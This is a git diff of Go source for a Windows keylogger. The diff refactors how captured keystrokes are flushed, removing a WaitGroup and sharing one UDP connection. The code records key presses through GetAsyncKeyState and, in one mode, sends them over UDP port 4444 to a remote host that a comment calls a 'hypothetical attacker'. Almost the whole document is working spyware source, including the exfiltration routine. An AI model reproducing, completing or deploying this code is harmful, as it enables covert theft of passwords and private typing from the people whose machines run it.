@@ -7,7 +7,6 @@ import (
 	"os"
 	"strconv"
 	"strings"
-	"sync"
 	"syscall"
 	"time"
 )
@@ -150,8 +149,6 @@ var (
 	getState = user32.NewProc("GetAsyncKeyState")
 )
 
-var wg sync.WaitGroup
-
 // represents the keylogger
 type keylogger struct {
 	// true if currently logging, false if not
@@ -190,6 +187,10 @@ func (k *keylogger) start(duration int) {
 
 	k.active = true
 
+	// create UDP listener - regardless of whether the keylogger is set to this mode or not
+	conn, err := net.ListenUDP("udp", &net.UDPAddr{Port: 3333}) // outgoing port
+	check(err)
+
 	if duration == -1 { // then the loop should run forever (until manually stopped)
 		duration = 31536000 // the amount of seconds in one year
 	}
@@ -227,11 +228,10 @@ func (k *keylogger) start(duration int) {
 		}
 
 		if time.Since(lastBufferFlush) > time.Duration(5)*time.Second {
-			wg.Add(1)
 			if k.mode == 0 {
-				go k.saveToFile(&buffer, &wg)
+				go k.saveToFile(&buffer)
 			} else if k.mode == 1 {
-				go k.sendToHost(&buffer, &wg)
+				go k.sendToHost(&buffer, conn)
 			}
 			lastBufferFlush = time.Now()
 		}
@@ -239,30 +239,27 @@ func (k *keylogger) start(duration int) {
 		prevCurrentKeys = currentKeys
 		time.Sleep(10 * time.Millisecond) // limit logging to every 1/100 second
 	}
-	fmt.Println(wg)
 	// do not run these final buffer flushes concurrently or they will not finish before the main function returns
-	wg.Wait()
 	if len(buffer) != 0 {
-		wg.Add(1)
 		if k.mode == 0 {
-			k.saveToFile(&buffer, &wg)
+			k.saveToFile(&buffer)
 		} else if k.mode == 1 {
-			k.sendToHost(&buffer, &wg)
+			k.sendToHost(&buffer, conn)
 		}
 	}
 	k.active = false
 }
 
 // returns all the events for when a key is pressed down
-func (k *keylogger) getDownEvents() []key {
-	downEvents := []key{}
-	for _, key := range k.log {
-		if key.down {
-			downEvents = append(downEvents, key)
-		}
-	}
-	return downEvents
-}
+// func (k *keylogger) getDownEvents() []key {
+// 	downEvents := []key{}
+// 	for _, key := range k.log {
+// 		if key.down {
+// 			downEvents = append(downEvents, key)
+// 		}
+// 	}
+// 	return downEvents
+// }
 
 func (k *keylogger) setMode(mode int, info string) {
 	k.mode = mode
@@ -276,7 +273,7 @@ func (k *keylogger) setMode(mode int, info string) {
 }
 
 // save buffer to file
-func (k *keylogger) saveToFile(buffer *[]key, wg *sync.WaitGroup) {
+func (k *keylogger) saveToFile(buffer *[]key) {
 	fmt.Println("Doing a write")
 	downEvents := []key{}
 	for _, key := range *buffer {
@@ -295,21 +292,16 @@ func (k *keylogger) saveToFile(buffer *[]key, wg *sync.WaitGroup) {
 	}
 
 	*buffer = nil
-	wg.Done()
 }
 
 // send buffer data to remote host (hypothetical attacker)
-func (k *keylogger) sendToHost(buffer *[]key, wg *sync.WaitGroup) {
-	fmt.Println("Starting sendToHost")
+func (k *keylogger) sendToHost(buffer *[]key, conn *net.UDPConn) {
 	downEvents := []key{}
 	for _, key := range *buffer {
 		if key.down {
 			downEvents = append(downEvents, key)
 		}
 	}
-
-	conn, err := net.ListenUDP("udp", &net.UDPAddr{Port: 3333}) // outgoing port
-	check(err)
 
 	// create string representing the keystrokes from the buffer
 	var dataString string = ""
@@ -324,14 +316,12 @@ func (k *keylogger) sendToHost(buffer *[]key, wg *sync.WaitGroup) {
 	octet3, _ := strconv.Atoi(ipSplit[2])
 	octet4, _ := strconv.Atoi(ipSplit[3])
 
-	_, err = conn.WriteTo([]byte(dataString), &net.UDPAddr{IP: net.IP{byte(octet1), byte(octet2), byte(octet3), byte(octet4)}, Port: 4444})
+	_, err := conn.WriteTo([]byte(dataString), &net.UDPAddr{IP: net.IP{byte(octet1), byte(octet2), byte(octet3), byte(octet4)}, Port: 4444})
 	if err != nil {
 		fmt.Println("Failed to send data:", dataString)
 	}
 
 	*buffer = nil
-	wg.Done()
-	fmt.Println("Just ended sendToHost")
 }
 
 // stop running if there is an error
